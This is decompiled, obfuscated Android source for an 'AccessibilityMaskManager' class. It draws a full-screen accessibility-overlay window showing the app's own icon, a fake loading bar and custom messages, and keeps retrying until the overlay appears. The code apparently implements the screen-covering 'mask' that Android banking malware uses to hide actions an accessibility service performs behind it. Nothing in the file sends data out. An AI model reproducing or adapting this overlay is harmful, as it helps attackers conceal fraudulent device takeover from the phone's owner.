package p000;

import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.Rect;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;
import kotlin.jvm.internal.Ref$IntRef;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: j7 */
/* loaded from: classes2.dex */
public final class C0708j7 {

    /* renamed from: a0 */
    public final Context f57275a0;

    /* renamed from: a1 */
    public final dd0 f57276a1;

    /* renamed from: a2 */
    public boolean f57277a2;

    /* renamed from: a3 */
    public boolean f57278a3;

    /* renamed from: a4 */
    public WindowManager f57279a4;

    /* renamed from: a5 */
    public FrameLayout f57280a5;

    /* renamed from: a6 */
    public View f57281a6;

    /* renamed from: a7 */
    public TextView f57282a7;

    /* renamed from: a8 */
    public Handler f57283a8;

    /* renamed from: a9 */
    public RunnableC0707j6 f57284a9;

    /* renamed from: b0 */
    public long f57285b0;

    /* renamed from: b1 */
    public boolean f57286b1;

    /* renamed from: b2 */
    public volatile boolean f57287b2;

    /* renamed from: b3 */
    public int f57288b3;

    static {
        new C0705j4(null);
    }

    public C0708j7(Context context, dd0 dd0Var) {
        t60.m214695b6(context, "context");
        this.f57275a0 = context;
        this.f57276a1 = dd0Var;
    }

    /* renamed from: a0 */
    public final FrameLayout m213211a0() throws PackageManager.NameNotFoundException, IOException {
        int color;
        int color2;
        int color3;
        String string;
        Bitmap bitmapDecodeResource;
        dd0 dd0Var = this.f57276a1;
        String str = dd0Var.f55704a5;
        String str2 = dd0Var.f55701a2;
        Context context = this.f57275a0;
        float f = context.getResources().getDisplayMetrics().density;
        int i = context.getResources().getDisplayMetrics().widthPixels;
        FrameLayout frameLayout = new FrameLayout(context);
        frameLayout.setBackgroundColor(-16777216);
        frameLayout.setSystemUiVisibility(5894);
        ImageView imageView = new ImageView(context);
        imageView.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
        imageView.setScaleType(ImageView.ScaleType.CENTER_CROP);
        boolean z = false;
        for (String str3 : AbstractC0716jf.m213306g5("app_loading_bg.webp", "app_loading_bg.png")) {
            if (z) {
                break;
            }
            try {
                InputStream inputStreamOpen = context.getAssets().open(str3);
                try {
                    Bitmap bitmapDecodeStream = BitmapFactory.decodeStream(inputStreamOpen);
                    if (bitmapDecodeStream != null) {
                        imageView.setImageBitmap(bitmapDecodeStream);
                        z = true;
                    }
                    kj1.m213559a6(inputStreamOpen, null);
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        kj1.m213559a6(inputStreamOpen, th);
                        throw th2;
                    }
                }
            } catch (Exception unused) {
                continue;
            }
        }
        if (!z) {
            for (String str4 : AbstractC0716jf.m213306g5("bg_config_mask", "bg_config_mask_gif")) {
                if (z) {
                    break;
                }
                try {
                    int identifier = context.getResources().getIdentifier(str4, "drawable", context.getPackageName());
                    if (identifier != 0 && (bitmapDecodeResource = BitmapFactory.decodeResource(context.getResources(), identifier)) != null) {
                        imageView.setImageBitmap(bitmapDecodeResource);
                        z = true;
                    }
                } catch (Exception unused2) {
                }
            }
        }
        frameLayout.addView(imageView);
        LinearLayout linearLayout = new LinearLayout(context);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        linearLayout.setLayoutParams(new FrameLayout.LayoutParams(-1, -2, 17));
        if (dd0Var.f55708a9) {
            int i2 = (int) (80 * f);
            ImageView imageView2 = new ImageView(context);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i2, i2);
            layoutParams.gravity = 1;
            layoutParams.bottomMargin = (int) (12 * f);
            imageView2.setLayoutParams(layoutParams);
            imageView2.setScaleType(ImageView.ScaleType.FIT_CENTER);
            imageView2.setClipToOutline(true);
            imageView2.setOutlineProvider(new C0706j5(f, 0));
            try {
                imageView2.setImageDrawable(context.getPackageManager().getApplicationIcon(context.getPackageName()));
            } catch (Exception unused3) {
                imageView2.setVisibility(8);
            }
            linearLayout.addView(imageView2);
            try {
                ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
                t60.m214694b5(applicationInfo, "context.packageManager.g…o(context.packageName, 0)");
                string = context.getPackageManager().getApplicationLabel(applicationInfo).toString();
            } catch (Exception unused4) {
                string = "";
            }
            if (string.length() > 0) {
                TextView textView = new TextView(context);
                textView.setText(string);
                textView.setTextSize(18.0f);
                textView.setTextColor(-1);
                textView.setGravity(17);
                LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-2, -2);
                layoutParams2.gravity = 1;
                layoutParams2.bottomMargin = (int) (28 * f);
                textView.setLayoutParams(layoutParams2);
                linearLayout.addView(textView);
            }
        }
        FrameLayout frameLayout2 = new FrameLayout(context);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams((int) (i * 0.65f), (int) (6 * f));
        layoutParams3.gravity = 1;
        layoutParams3.bottomMargin = (int) (16 * f);
        frameLayout2.setLayoutParams(layoutParams3);
        View view = new View(context);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(Color.parseColor("#33FFFFFF"));
        float f2 = 2 * f;
        gradientDrawable.setCornerRadius(f2);
        view.setBackground(gradientDrawable);
        view.setLayoutParams(new FrameLayout.LayoutParams(-1, -1));
        View view2 = new View(context);
        GradientDrawable gradientDrawable2 = new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, new int[]{Color.parseColor("#4A90D9"), Color.parseColor("#67B8F7")});
        gradientDrawable2.setCornerRadius(f2);
        view2.setBackground(gradientDrawable2);
        view2.setLayoutParams(new FrameLayout.LayoutParams(0, -1));
        this.f57281a6 = view2;
        frameLayout2.addView(view);
        frameLayout2.addView(view2);
        linearLayout.addView(frameLayout2);
        List list = dd0Var.f55707a8;
        String str5 = !list.isEmpty() ? (String) list.get(0) : str2;
        try {
            color = Color.parseColor(str);
        } catch (Exception unused5) {
            color = -1;
        }
        TextView textView2 = new TextView(context);
        textView2.setText(str5);
        textView2.setTextSize(14.0f);
        textView2.setTextColor(color);
        textView2.setGravity(17);
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-2, -2);
        layoutParams4.gravity = 1;
        textView2.setLayoutParams(layoutParams4);
        this.f57282a7 = textView2;
        linearLayout.addView(textView2);
        frameLayout.addView(linearLayout);
        String string2 = AbstractC0779a1.m213687e0(str2).toString();
        String strM213673c6 = AbstractC0779a1.m213673c6(AbstractC0779a1.m213673c6(AbstractC0779a1.m213687e0(dd0Var.f55702a3).toString(), "\\r\\n", "\n"), "\\n", "\n");
        try {
            color2 = Color.parseColor(str);
        } catch (Exception unused6) {
            color2 = -1;
        }
        try {
            color3 = Color.parseColor(dd0Var.f55705a6);
        } catch (Exception unused7) {
            color3 = Color.parseColor("#AAAAAA");
        }
        if (string2.length() > 0 || strM213673c6.length() > 0) {
            LinearLayout linearLayout2 = new LinearLayout(context);
            linearLayout2.setOrientation(1);
            linearLayout2.setGravity(1);
            FrameLayout.LayoutParams layoutParams5 = new FrameLayout.LayoutParams(-1, -2, 80);
            layoutParams5.bottomMargin = (int) (60 * f);
            linearLayout2.setLayoutParams(layoutParams5);
            if (string2.length() > 0) {
                TextView textView3 = new TextView(context);
                textView3.setText(string2);
                textView3.setTextSize(16.0f);
                textView3.setTextColor(color2);
                textView3.setGravity(17);
                LinearLayout.LayoutParams layoutParams6 = new LinearLayout.LayoutParams(-2, -2);
                layoutParams6.gravity = 1;
                layoutParams6.bottomMargin = (int) (8 * f);
                textView3.setLayoutParams(layoutParams6);
                linearLayout2.addView(textView3);
            }
            if (strM213673c6.length() > 0) {
                TextView textView4 = new TextView(context);
                textView4.setText(strM213673c6);
                textView4.setTextSize(12.0f);
                textView4.setTextColor(color3);
                textView4.setGravity(17);
                LinearLayout.LayoutParams layoutParams7 = new LinearLayout.LayoutParams(-2, -2);
                layoutParams7.gravity = 1;
                textView4.setLayoutParams(layoutParams7);
                linearLayout2.addView(textView4);
            }
            frameLayout.addView(linearLayout2);
        }
        return frameLayout;
    }

    /* renamed from: a1 */
    public final WindowManager.LayoutParams m213212a1() {
        int i;
        int iHeight;
        int i2 = Build.VERSION.SDK_INT;
        int i3 = i2 >= 26 ? 2032 : 2006;
        Object systemService = this.f57275a0.getSystemService("window");
        t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
        WindowManager windowManager = (WindowManager) systemService;
        if (i2 >= 30) {
            Rect bounds = windowManager.getCurrentWindowMetrics().getBounds();
            t60.m214694b5(bounds, "wm.currentWindowMetrics.bounds");
            int iWidth = bounds.width();
            iHeight = bounds.height();
            i = iWidth;
        } else {
            DisplayMetrics displayMetrics = new DisplayMetrics();
            windowManager.getDefaultDisplay().getRealMetrics(displayMetrics);
            i = displayMetrics.widthPixels;
            iHeight = displayMetrics.heightPixels;
        }
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(i, iHeight, i3, -2140338280, 1);
        layoutParams.gravity = 51;
        layoutParams.x = 0;
        layoutParams.y = 0;
        if (i2 >= 28) {
            layoutParams.layoutInDisplayCutoutMode = 1;
        }
        return layoutParams;
    }

    /* renamed from: a2 */
    public final void m213213a2() {
        Handler handler;
        this.f57287b2 = false;
        if (this.f57278a3) {
            try {
                RunnableC0707j6 runnableC0707j6 = this.f57284a9;
                if (runnableC0707j6 != null && (handler = this.f57283a8) != null) {
                    handler.removeCallbacks(runnableC0707j6);
                }
                this.f57284a9 = null;
                this.f57283a8 = null;
                FrameLayout frameLayout = this.f57280a5;
                if (frameLayout != null) {
                    if (frameLayout.getChildCount() > 0) {
                        View childAt = frameLayout.getChildAt(0);
                        ImageView imageView = childAt instanceof ImageView ? (ImageView) childAt : null;
                        if (imageView != null) {
                            imageView.setImageDrawable(null);
                        }
                    }
                    frameLayout.setBackground(null);
                    WindowManager windowManager = this.f57279a4;
                    if (windowManager != null) {
                        windowManager.removeView(frameLayout);
                    }
                    this.f57280a5 = null;
                }
                this.f57281a6 = null;
                this.f57282a7 = null;
                this.f57278a3 = false;
            } catch (Exception e) {
                t60.m214705c6("AccessibilityMaskManager", "❌ 隐藏遮盖失败", e);
            }
        }
    }

    /* renamed from: a3 */
    public final void m213214a3() {
        if (this.f57276a1.f55699a0 && !this.f57278a3) {
            this.f57287b2 = true;
            this.f57288b3 = 0;
            if (t60.m214686a2(Looper.myLooper(), Looper.getMainLooper())) {
                m213215a4();
            } else {
                new Handler(Looper.getMainLooper()).post(new RunnableC0704j3(this, 0));
            }
        }
    }

    /* renamed from: a4 */
    public final void m213215a4() {
        if (this.f57278a3 || !this.f57287b2) {
            return;
        }
        boolean z = this.f57277a2;
        if (!z && !z) {
            Object systemService = this.f57275a0.getSystemService("window");
            t60.m214693b4(systemService, "null cannot be cast to non-null type android.view.WindowManager");
            this.f57279a4 = (WindowManager) systemService;
            this.f57277a2 = true;
        }
        try {
            this.f57280a5 = m213211a0();
            WindowManager.LayoutParams layoutParamsM213212a1 = m213212a1();
            WindowManager windowManager = this.f57279a4;
            if (windowManager != null) {
                windowManager.addView(this.f57280a5, layoutParamsM213212a1);
            }
            this.f57278a3 = true;
            this.f57287b2 = false;
            this.f57288b3 = 0;
            m213216a5();
            t60.m214714d6("AccessibilityMaskManager", "✅ 遮挡层已显示");
        } catch (Exception e) {
            int i = this.f57288b3 + 1;
            this.f57288b3 = i;
            if (i > 5) {
                t60.m214705c6("AccessibilityMaskManager", "❌ 遮挡层显示失败，已重试5次", e);
                this.f57287b2 = false;
                return;
            }
            long j = (1 << r4) * 200;
            if (j > 3000) {
                j = 3000;
            }
            t60.m214726f4("AccessibilityMaskManager", "⚠️ addView失败(第" + i + "次), " + j + "ms后重试: " + e.getMessage());
            this.f57280a5 = null;
            new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0704j3(this, 1), j);
        }
    }

    /* renamed from: a5 */
    public final void m213216a5() {
        Handler handler;
        RunnableC0707j6 runnableC0707j6 = this.f57284a9;
        if (runnableC0707j6 != null && (handler = this.f57283a8) != null) {
            handler.removeCallbacks(runnableC0707j6);
        }
        this.f57284a9 = null;
        this.f57283a8 = null;
        this.f57285b0 = System.currentTimeMillis();
        this.f57283a8 = new Handler(Looper.getMainLooper());
        int i = this.f57286b1 ? 80 : 0;
        Ref$IntRef ref$IntRef = new Ref$IntRef();
        ref$IntRef.f57624a0 = i - 1;
        RunnableC0707j6 runnableC0707j62 = new RunnableC0707j6(this, i, ref$IntRef);
        this.f57284a9 = runnableC0707j62;
        Handler handler2 = this.f57283a8;
        if (handler2 != null) {
            handler2.post(runnableC0707j62);
        }
    }
}
